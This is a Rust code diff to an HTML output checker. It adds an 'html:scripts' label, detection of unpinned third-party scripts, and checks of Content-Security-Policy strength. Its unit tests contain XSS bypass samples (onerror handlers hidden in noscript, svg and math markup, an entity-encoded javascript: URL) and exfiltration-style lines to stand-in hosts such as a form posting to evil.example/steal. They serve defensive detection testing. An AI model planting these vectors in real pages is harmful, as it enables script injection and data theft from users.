@@ -5,6 +5,10 @@
 //! scripts, and the markup makes no request the user didn't ask for to
 //! another host or to a sensitive route (no meta refresh, no form off the
 //! app, nothing loaded from another host, nothing that fires by itself).
+//! `html:scripts`: scripts may run, but they come from the app's origin or
+//! from granted hosts with an `integrity` hash, a Content-Security-Policy
+//! keeps them on the app's origin and the granted hosts, and the markup
+//! itself makes no request `html:safe` forbids.
 //! `url:local`: a path on the app's own host, so `//evil`, `/\evil` and
 //! schemes fail.
 //!
@@ -21,9 +25,10 @@ use serde_json::{Value, json};
 
 use crate::detect::{Finding, Severity};
 use crate::harness::field;
+use crate::html::doc;
 use crate::manifest::Manifest;
 use crate::record::{OutcomeKind, RunRecord};
-use crate::urls::{classify, elements, in_html, normalize};
+use crate::urls::{classify, in_html, normalize};
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
 pub enum OutputLabel {
@@ -31,6 +36,8 @@ pub enum OutputLabel {
     HtmlNoScripts,
     #[serde(rename = "html:safe")]
     HtmlSafe,
+    #[serde(rename = "html:scripts")]
+    HtmlScripts,
     #[serde(rename = "url:local")]
     UrlLocal,
 }
@@ -40,6 +47,7 @@ impl OutputLabel {
         match self {
             OutputLabel::HtmlNoScripts => "html:no-scripts",
             OutputLabel::HtmlSafe => "html:safe",
+            OutputLabel::HtmlScripts => "html:scripts",
             OutputLabel::UrlLocal => "url:local",
         }
     }
@@ -67,7 +75,7 @@ fn hit(what: String, tag: &str, severity: Severity) -> Hit {
 /// Whether an attribute name looks like an event handler in some
 /// framework: `onclick`, `@click`, `x-on:click`, `hx-on::after`,
 /// `v-on:click`, `(click)`, `data-on-click`.
-fn is_handler(k: &str) -> bool {
+pub(crate) fn is_handler(k: &str) -> bool {
     let k = k.strip_prefix("data-").unwrap_or(k);
     if k.starts_with('@') || k.starts_with('(') {
         return true;
@@ -79,10 +87,22 @@ fn is_handler(k: &str) -> bool {
     w.iter().enumerate().any(|(i, x)| *x == "on" && i + 1 < w.len())
 }
 
+/// Whether a framework reads an attribute's value as an expression:
+/// Alpine and Vue (`x-…`, `v-…`, `:…`), Angular (`ng-…`, `[…]`, `*…`).
+pub(crate) fn is_expression(k: &str) -> bool {
+    let k = k.strip_prefix("data-").unwrap_or(k);
+    // Names, class lists and markers, not expressions.
+    const NOT: &[&str] = &["x-cloak", "x-ref", "x-teleport", "x-ignore", "v-cloak", "v-pre", "v-once", "ng-cloak", "ng-non-bindable"];
+    if NOT.contains(&k) || k.starts_with("x-transition") {
+        return false;
+    }
+    k.starts_with(':') || k.starts_with('[') || k.starts_with('*') || ["x-", "v-", "ng-"].iter().any(|p| k.starts_with(p))
+}
+
 /// Ways the markup can run a script.
 pub fn scripts(html: &str) -> Vec<Hit> {
     let mut out = Vec::new();
-    for t in elements(html).iter() {
+    for t in &doc(html).elements {
         if ACTIVE_TAGS.contains(&t.name.as_str()) {
             out.push(hit(format!("a <{}> element", t.name), &t.raw, Severity::Fail));
             continue;
@@ -121,13 +141,23 @@ fn script_url(v: &str) -> bool {
 
 /// Requests the markup makes that the user didn't ask for, or makes to
 /// another host or a sensitive route.
-pub fn unsafe_actions(html: &str, sensitive: &[String]) -> Vec<Hit> {
+///
+/// With `scripts` allowed, where scripts load from and what they fetch
+/// from other hosts is for `unpinned_scripts` and the
+/// Content-Security-Policy. A sensitive route named in a script stays a
+/// warn: the static check can't see whether it is called.
+pub fn unsafe_actions(html: &str, sensitive: &[String], scripts: bool) -> Vec<Hit> {
     let mut out = Vec::new();
+    let d = doc(html);
+    let script_tags: Vec<&str> = if scripts { script_loads(&d).into_iter().map(|(_, e)| e.raw.as_str()).collect() } else { Vec::new() };
+    let by_script = |f: &crate::urls::Found| {
+        scripts && (f.source == "script" || is_handler(&f.source) || is_expression(&f.source) || script_tags.contains(&f.tag.as_str()))
+    };
     let is_sensitive = |u: &str| {
         let path = u.split(['?', '#']).next().unwrap_or(u);
         sensitive.iter().find(|s| path == s.as_str() || path.starts_with(&format!("{}/", s.trim_end_matches('/'))))
     };
-    for t in elements(html).iter() {
+    for t in &doc(html).elements {
         if t.name == "meta" && t.get("http-equiv").is_some_and(|h| h.eq_ignore_ascii_case("refresh")) {
             out.push(hit("a meta refresh (the page moves on by itself)".into(), &t.raw, Severity::Fail));
         }
@@ -147,6 +177,12 @@ pub fn unsafe_actions(html: &str, sensitive: &[String]) -> Vec<Hit> {
         }
         let short: String = u.chars().take(80).collect();
         let (k, off) = (&f.source, kind != "same_host");
+        if by_script(&f) {
+            if let Some(s) = is_sensitive(&u).filter(|_| !off) {
+                out.push(hit(format!("a script that names the sensitive route {s} ({k} = {short})"), &f.tag, Severity::Warn));
+            }
+            continue;
+        }
         let what = match f.trigger.as_str() {
             "form" => "a form",
             "load" => "a load",
@@ -166,6 +202,85 @@ pub fn unsafe_actions(html: &str, sensitive: &[String]) -> Vec<Hit> {
         }
     }
     out
+}
+
+/// Elements that load a script, with the URL: `<script src>`, `<link
+/// rel=modulepreload>` and `<link rel=preload as=script>`.
+fn script_loads(doc: &crate::html::Doc) -> Vec<(&str, &crate::html::Element)> {
+    let mut out = Vec::new();
+    for e in &doc.elements {
+        let rel = e.get("rel").unwrap_or("").to_ascii_lowercase();
+        let rel: Vec<&str> = rel.split_ascii_whitespace().collect();
+        let preload = rel.contains(&"modulepreload") || (rel.contains(&"preload") && e.get("as").is_some_and(|a| a.eq_ignore_ascii_case("script")));
+        let url = match e.name.as_str() {
+            "script" => e.get("src"),
+            "link" if preload => e.get("href"),
+            _ => None,
+        };
+        if let Some(u) = url {
+            out.push((u, e));
+        }
+    }
+    out
+}
+
+/// `import "…"`, `import x from "…"`, `import("…")`, `export … from "…"`.
+static IMPORT: LazyLock<Regex> = LazyLock::new(|| Regex::new(r#"\b(?:import|from)\s*\(?\s*["'`]([^"'`\s]+)["'`]"#).unwrap());
+
+/// Scripts the markup loads from another host without pinning them to
+/// what was reviewed: from a host the grants don't list, or without an
+/// `integrity` hash (for module imports: in the import map or a
+/// `modulepreload` link).
+pub fn unpinned_scripts(html: &str, hosts: &[String]) -> Vec<(String, Hit)> {
+    let doc = doc(html);
+    let mut out = Vec::new();
+    // Import map: bare names to URLs, URLs to hashes.
+    let (mut imports, mut hashes) = (serde_json::Map::new(), serde_json::Map::new());
+    for e in doc.elements.iter().filter(|e| e.name == "script" && e.get("type").is_some_and(|t| t.trim().eq_ignore_ascii_case("importmap"))) {
+        if let Some(Ok(Value::Object(map))) = e.body.as_deref().map(serde_json::from_str::<Value>) {
+            imports.extend(map.get("imports").and_then(Value::as_object).cloned().unwrap_or_default());
+            hashes.extend(map.get("integrity").and_then(Value::as_object).cloned().unwrap_or_default());
+        }
+    }
+    let loads = script_loads(&doc);
+    for (u, e) in &loads {
+        let pinned = e.get("integrity").is_some_and(|i| !i.trim().is_empty()) || hashes.get(*u).and_then(Value::as_str).is_some_and(|h| !h.trim().is_empty());
+        if let Some((host, what)) = unpinned(u, pinned, hosts) {
+            out.push((host, hit(what, &e.raw, Severity::Fail)));
+        }
+    }
+    for e in doc.elements.iter().filter(|e| e.name == "script" && e.get("src").is_none()) {
+        let Some(code) = e.body.as_deref() else { continue };
+        for c in IMPORT.captures_iter(code) {
+            let spec = &c[1];
+            let url = imports.get(spec).and_then(Value::as_str).unwrap_or(spec);
+            if !(url.contains("://") || url.starts_with("//")) {
+                continue;
+            }
+            let pinned = hashes.get(url).and_then(Value::as_str).is_some_and(|h| !h.trim().is_empty())
+                || loads.iter().any(|(l, p)| *l == url && p.get("integrity").is_some_and(|i| !i.trim().is_empty()));
+            if let Some((host, what)) = unpinned(url, pinned, hosts) {
+                out.push((host, hit(format!("{what} (imported)"), "<script>", Severity::Fail)));
+            }
+        }
+    }
+    out
+}
+
+/// Why a script from `u` is not pinned, if it isn't: (host, why).
+fn unpinned(u: &str, integrity: bool, hosts: &[String]) -> Option<(String, String)> {
+    let (kind, host, _) = classify(&normalize(u));
+    let host = host?;
+    let short: String = u.chars().take(80).collect();
+    if kind == "same_host" {
+        None
+    } else if !crate::dest::granted(&host, hosts) {
+        Some((host, format!("a script from {short}, a host the grants don't list")))
+    } else if !integrity {
+        Some((host, format!("a script from {short} without an integrity hash")))
+    } else {
+        None
+    }
 }
 
 /// Whether a URL is a path on the app's own host.
@@ -189,6 +304,50 @@ pub fn check(r: &RunRecord, m: &Manifest) -> Vec<Finding> {
         let Some(Value::String(v)) = field(result, path) else { continue };
         let from_req = |s: &str| req.iter().find(|q| s.contains(q.as_str())).cloned();
         match label {
+            OutputLabel::HtmlScripts => {
+                for Hit { what, tag, severity } in unsafe_actions(v, &entry.sensitive_paths, true) {
+                    out.push(Finding::new(
+                        "unsafe_action",
+                        &format!("{ex}\0{path}\0{}", what.split(' ').take(4).collect::<Vec<_>>().join(" ")),
+                        severity,
+                        format!("{path} is labelled html:scripts but holds {what}"),
+                        json!({"path": path, "label": label.name(), "what": what, "tag": tag, "from_request": from_req(&tag)}),
+                        run,
+                    ));
+                }
+                out.extend(unpinned_findings(r, m, path, v, Severity::Fail));
+                if scripts(v).is_empty() {
+                    continue;
+                }
+                // The policies that apply: the response's, the markup's, the platform's.
+                let resp = crate::output::response(r, m);
+                let metas: Vec<String> = doc(v)
+                    .elements
+                    .iter()
+                    .filter(|e| e.name == "meta" && e.get("http-equiv").is_some_and(|h| h.trim().eq_ignore_ascii_case("content-security-policy")))
+                    .filter_map(|e| e.get("content").map(str::to_string))
+                    .collect();
+                let mut policies: Vec<&str> =
+                    resp.headers.iter().filter(|(n, _)| n.eq_ignore_ascii_case("content-security-policy")).map(|(_, v)| v.as_str()).collect();
+                policies.extend(metas.iter().map(String::as_str));
+                policies.extend(entry.csp.as_deref());
+                let hosts = m.grants.hosts.clone().unwrap_or_default();
+                let weak = crate::csp::weaknesses(&policies, &hosts);
+                for (severity, list) in
+                    [Severity::Fail, Severity::Warn].map(|s| (s, weak.iter().filter(|(w, _)| *w == s).map(|(_, t)| t.as_str()).collect::<Vec<_>>()))
+                {
+                    let Some(first) = list.first() else { continue };
+                    let more = if list.len() > 1 { format!(" (and {} more)", list.len() - 1) } else { String::new() };
+                    out.push(Finding::new(
+                        "weak_csp",
+                        &format!("{ex}\0{path}\0{severity:?}"),
+                        severity,
+                        format!("{path} is labelled html:scripts and runs scripts, but its Content-Security-Policy {first}{more}"),
+                        json!({"path": path, "label": label.name(), "problems": list, "policies": policies}),
+                        run,
+                    ));
+                }
+            }
             OutputLabel::HtmlNoScripts | OutputLabel::HtmlSafe => {
                 for Hit { what, tag, severity } in scripts(v) {
                     out.push(Finding::new(
@@ -204,13 +363,13 @@ pub fn check(r: &RunRecord, m: &Manifest) -> Vec<Finding> {
                         run,
                     ));
                 }
-                if *label == OutputLabel::HtmlSafe {
-                    for Hit { what, tag, severity } in unsafe_actions(v, &entry.sensitive_paths) {
+                if *label != OutputLabel::HtmlNoScripts {
+                    for Hit { what, tag, severity } in unsafe_actions(v, &entry.sensitive_paths, *label == OutputLabel::HtmlScripts) {
                         out.push(Finding::new(
                             "unsafe_action",
                             &format!("{ex}\0{path}\0{}", what.split(' ').take(4).collect::<Vec<_>>().join(" ")),
                             severity,
-                            format!("{path} is labelled html:safe but holds {what}"),
+                            format!("{path} is labelled {} but holds {what}", label.name()),
                             json!({"path": path, "label": label.name(), "what": what, "tag": tag, "from_request": from_req(&tag)}),
                             run,
                         ));
@@ -237,6 +396,25 @@ pub fn check(r: &RunRecord, m: &Manifest) -> Vec<Finding> {
         }
     }
     out
+}
+
+/// `unpinned_script` findings for the markup at `path`.
+pub(crate) fn unpinned_findings(r: &RunRecord, m: &Manifest, path: &str, html: &str, severity: Severity) -> Vec<Finding> {
+    let hosts = m.grants.hosts.clone().unwrap_or_default();
+    let ex = &r.spec.export;
+    unpinned_scripts(html, &hosts)
+        .into_iter()
+        .map(|(host, Hit { what, tag, .. })| {
+            Finding::new(
+                "unpinned_script",
+                &format!("{ex}\0{path}\0{host}"),
+                severity,
+                format!("{path} loads {what}: the code can change after the review"),
+                json!({"path": path, "what": what, "tag": tag}),
+                Some(r.id.as_str()),
+            )
+        })
+        .collect()
 }
 
 /// Strings in the request a user could have chosen (4 characters or more).
@@ -281,9 +459,30 @@ mod tests {
     }
 
     #[test]
+    fn reads_markup_as_a_browser_does() {
+        // Markup a browser runs, though a reader by patterns sees none.
+        for runs in [
+            r#"<noscript><p title="</noscript><img src=x onerror=alert(1)>">"#,
+            "<svg><style><img src=x onerror=alert(1)></style></svg>",
+            "<math><style><img src=x onerror=alert(1)></style></math>",
+            r#"<p title=a"b onclick=alert(1)>"#,
+            r#"<a href="javas&#99ript:alert(1)">x</a>"#,
+        ] {
+            let h = scripts(runs);
+            assert!(h.iter().any(|h| h.severity == Severity::Fail), "{runs}: {:?}", whats(h));
+        }
+        // Markup a browser shows as text.
+        for inert in
+            ["<!-- <img src=x onerror=alert(1)> -->", "<textarea><img src=x onerror=alert(1)></textarea>", "<title><img src=x onerror=alert(1)></title>"]
+        {
+            assert!(scripts(inert).is_empty(), "{inert}");
+        }
+    }
+
+    #[test]
     fn finds_unsafe_actions() {
         let s = vec!["/admin".to_string()];
-        let n = |h: &str| unsafe_actions(h, &s).len();
+        let n = |h: &str| unsafe_actions(h, &s, false).len();
         assert_eq!(n("<form method=post action=\"/order\"><button>x</button></form>"), 0);
         assert_eq!(n("<a href=\"https://other.example/\">x</a>"), 0);
         assert_eq!(n("<form action=\"https://evil.example/steal\">"), 1);
@@ -299,6 +498,38 @@ mod tests {
         assert_eq!(n("<img src=\"/logo.png\">"), 0);
         assert_eq!(n("<div data-endpoint=\"/admin/x\"></div>"), 1);
         assert_eq!(n("<script>navigator.sendBeacon('https://c.example/p')</script>"), 1);
+        // With scripts allowed, what scripts fetch is for the CSP; a
+        // sensitive route they name stays a warn.
+        let w = |h: &str| unsafe_actions(h, &s, true).iter().map(|h| h.severity).collect::<Vec<_>>();
+        assert_eq!(w("<script>navigator.sendBeacon('https://c.example/p')</script>"), []);
+        assert_eq!(w("<script src=\"https://cdn.example/a.js\"></script>"), []);
+        assert_eq!(w("<div x-init=\"fetch('/admin/wipe')\"></div>"), [Severity::Warn]);
+        assert_eq!(w("<img src=\"https://t.example/p.gif\">"), [Severity::Fail]);
+        assert_eq!(w("<form action=\"https://evil.example/steal\">"), [Severity::Fail]);
+    }
+
+    #[test]
+    fn finds_unpinned_scripts() {
+        let hosts = vec!["cdn.example".to_string()];
+        let n = |h: &str| unpinned_scripts(h, &hosts).into_iter().map(|(_, h)| h.what).collect::<Vec<_>>();
+        assert_eq!(n("<script src=\"/app.js\"></script><script type=module src=\"./m.js\"></script>"), Vec::<String>::new());
+        assert_eq!(n("<script src=\"https://cdn.example/a.js\" integrity=\"sha384-x\"></script>"), Vec::<String>::new());
+        assert_eq!(n("<script src=\"https://cdn.example/a.js\"></script>"), ["a script from https://cdn.example/a.js without an integrity hash"]);
+        assert_eq!(
+            n("<script src=\"//evil.example/a.js\" integrity=\"sha384-x\"></script>"),
+            ["a script from //evil.example/a.js, a host the grants don't list"]
+        );
+        assert_eq!(n("<link rel=modulepreload href=\"https://cdn.example/m.js\">").len(), 1);
+        assert_eq!(n("<link rel=preload as=script href=\"https://cdn.example/m.js\">").len(), 1);
+        assert_eq!(n("<link rel=preload as=style href=\"https://cdn.example/m.css\">").len(), 0);
+        // Module imports: directly, or through the import map.
+        assert_eq!(n("<script type=module>import { a } from 'https://cdn.example/m.js'; a()</script>").len(), 1);
+        let map =
+            r#"<script type="importmap">{"imports": {"lit": "https://cdn.example/lit.js"}, "integrity": {"https://cdn.example/lit.js": "sha384-x"}}</script>"#;
+        assert_eq!(n(&format!("{map}<script type=module>import {{ html }} from 'lit'; import('lit')</script>")), Vec::<String>::new());
+        let map = r#"<script type="importmap">{"imports": {"lit": "https://cdn.example/lit.js"}}</script>"#;
+        assert_eq!(n(&format!("{map}<script type=module>import {{ html }} from 'lit'</script>")).len(), 1);
+        assert_eq!(n("<script>const a = Array.from('abc'); import('./local.js')</script>"), Vec::<String>::new());
     }
 
     #[test]
